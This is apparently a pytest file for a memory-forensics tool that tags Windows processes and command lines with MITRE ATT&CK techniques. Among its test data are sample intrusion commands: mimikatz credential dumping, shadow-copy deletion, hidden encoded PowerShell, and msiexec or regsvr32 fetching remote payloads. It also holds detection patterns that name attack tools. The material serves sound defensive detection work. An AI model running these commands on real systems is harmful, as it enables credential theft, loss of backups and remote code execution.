"""The memory-image ATT&CK patterns (post/mitre/patterns.py): a clean Windows host's processes,
connections and privileges tag nothing; the commands of an intrusion still do."""

import sys
from pathlib import Path

sys.path.append(str(Path(__file__).resolve().parents[2] / "src" / "analysis"))

from rowanholt.post.mitre.patterns import (PATTERN_MAPPINGS, MitrePatternMatcher, alternatives,  # noqa: E402
                                           literal_head, literal_heads, whole_words)

CLEAN = [
    {"PID": 4, "ImageFileName": "System"},
    {"PID": 640, "ImageFileName": "lsass.exe"},
    {"PID": 700, "ImageFileName": "services.exe"},
    {"PID": 900, "ImageFileName": "svchost.exe", "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"},
    {"PID": 1200, "ImageFileName": "explorer.exe", "Path": "C:\\Windows\\explorer.exe"},
    {"PID": 1300, "ImageFileName": "vmtoolsd.exe", "Path": "C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe"},
    {"LocalPort": "443", "ForeignPort": "53", "Owner": "svchost.exe"},
    {"Process": "rundll32.exe", "Args": "rundll32.exe shell32.dll,SHCreateLocalServerRunDll {9aa46009}"},
    {"Name": "SeDebugPrivilege", "Process": "lsass.exe"},
    {"Path": "C:\\Users\\a\\AppData\\Local\\Temp\\directory\\startup.log"},
    {"PID": 14634, "EventID": "4612"},
    # Real rows from a clean Windows 7 memory image (svcscan, dlllist)
    {"Name": "MSIServer", "Binary": "C:\\Windows\\system32\\msiexec.exe /V"},
    {"Name": "ProfSvc", "Display": "User Profile Service"},
    {"Name": "swprv", "Display": "Microsoft Software Shadow Copy Provider"},
    {"Name": "SstpSvc", "Display": "Secure Socket Tunneling Protocol Service"},
    {"Name": "SNMPTRAP", "Display": "SNMP Trap"},
    {"Name": "WinRM", "Display": "Windows Remote Management (WS-Management)"},
    {"Process": "mmc.exe", "Path": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll"},
    {"Process": "svchost.exe", "Path": "C:\\Windows\\system32\\msxml6.dll"},
    {"Process": "svchost.exe", "Path": "C:\\Windows\\system32\\mscoree.dll"},
    # filescan and privileges
    {"Name": "\\Windows\\System32\\tasklist.exe"},
    {"Name": "\\Windows\\System32\\winevt\\Logs\\Windows PowerShell.evtx"},
    {"Name": "\\Windows\\AppPatch\\sysmain.sdb"},
    {"Name": "\\Windows\\System32\\autochk.exe"},
    {"Description": "Adjust the time zone of the computer's internal clock"},
    {"Privilege": "SeLoadDriverPrivilege", "Process": "services.exe"},
]


def tags(records) -> set:
    matcher = MitrePatternMatcher()
    return set().union(*(matcher.scan_record(r) for r in records))


def test_whole_words_keeps_extensions_and_spaces() -> None:
    import re
    matches = re.compile(whole_words(r"tar|\.lnk|reg |schtask|setwindowshookex|regsvr"), re.I).search
    assert not matches("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
    assert all(matches(s) for s in ("tar -czf a.tgz", "x.LNK", "reg add HKCU", "schtasks /create",
                                     "SetWindowsHookExA", "regsvr32 /s /i:http://x scrobj.dll"))
    assert whole_words(r"at\.(?:exe|allow|deny)") == r"(?<![a-z0-9])at\.(?:exe|allow|deny)"


def test_literal_heads_are_what_a_match_must_contain() -> None:
    assert literal_head("Mimikatz") == "mimikatz" and literal_head(r"\.lnk") == ".lnk"
    assert literal_head("reg ") == "reg " and literal_head(r"c:\\windows\\temp") == "c:\\windows\\temp"
    assert literal_head("schtasks?") == "schtask" and literal_head("net(?:s|ex)") == "net"
    assert literal_head("ab*c") == "a" and literal_head("ab+c") == "ab" and literal_head("x{2}") == ""
    assert literal_head(r"\d+\.exe") == "" and literal_head("[a-z]at") == "" and literal_head("(a|b)c") == ""
    assert literal_heads(r"tar|\.lnk") == ("tar", ".lnk") and literal_heads(r"tar|\d+") is None


def test_skipping_patterns_by_their_heads_changes_no_match() -> None:
    """Every pattern's own words, in any case and in context, against the regexes run without
    the prefilter: the prefilter only saves time."""
    matcher = MitrePatternMatcher()

    def every_regex(text: str) -> set:
        return {t for compiled in matcher._compiled_patterns.values() for pattern, ids in compiled
                if pattern.search(text) for t in ids}

    words = [part.replace("\\", "") for patterns in PATTERN_MAPPINGS.values() for pattern in patterns
             for part in alternatives(pattern)]
    texts = [f"C:\\Users\\a\\{w} -x" for w in words] + [f"run {w.upper()}.exe" for w in words]
    texts += [" ".join(f"{k}={v}" for k, v in r.items()) for r in CLEAN] + ["pıng 10.0.0.1", "ſchtasks /create"]
    assert sum(bool(every_regex(t)) for t in texts) > len(words)  # the corpus does match
    assert all(matcher.match_content(t) == every_regex(t) for t in texts)


def test_a_clean_host_tags_nothing() -> None:
    assert tags(CLEAN) == set()


def test_an_intrusion_still_tags() -> None:
    found = tags([{"Process": "powershell.exe", "Args": "powershell.exe -w hidden -enc AAAA"},
                  {"Args": "mimikatz.exe sekurlsa::logonpasswords"},
                  {"Args": "vssadmin delete shadows /all /quiet"},
                  {"Args": "schtasks /create /tn x /tr c:\\x.exe"},
                  {"Args": "msiexec /q /i http://203.0.113.5/p.msi"},
                  {"Args": "winrs -r:dc01 whoami"},
                  {"Path": "C:\\Users\\a\\Desktop\\passwords.txt"},
                  {"Args": "tasklist /svc"},
                  {"Name": "\\Windows\\Tasks\\At1.job"}])
    assert {"T1059.001", "T1564.003", "T1003.001", "T1490", "T1053.005", "T1218.007", "T1021.006",
            "T1552.001", "T1007"} <= found


def test_a_memory_artefact_being_there_tags_nothing(tmp_path) -> None:
    import io
    import json
    from rowanholt.post.mitre.enrichment import MitreEnrichment
    enrichment = MitreEnrichment()
    for artefact, rows in (("memory_dlllist", [{"PID": 900, "Path": "C:\\Windows\\System32\\ntdll.dll"}]),
                           ("memory_modules", [{"Name": "ntoskrnl.exe", "Path": "\\SystemRoot\\system32\\ntoskrnl.exe"}]),
                           ("memory_cmdline", [{"PID": 900, "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs"}])):
        path = tmp_path / f"{artefact}.json"
        path.write_text(json.dumps(rows))
        written = io.StringIO()
        assert enrichment.enrich_json_file_streaming(str(path), written, artefact)
        assert written.getvalue() == "", artefact
    path = tmp_path / "memory_cmdline.json"
    path.write_text(json.dumps([{"PID": 4, "Args": "powershell.exe -nop -w hidden -enc AAAA"}]))
    written = io.StringIO()
    enrichment.enrich_json_file_streaming(str(path), written, "memory_cmdline")
    assert "T1059.001" in written.getvalue().split()
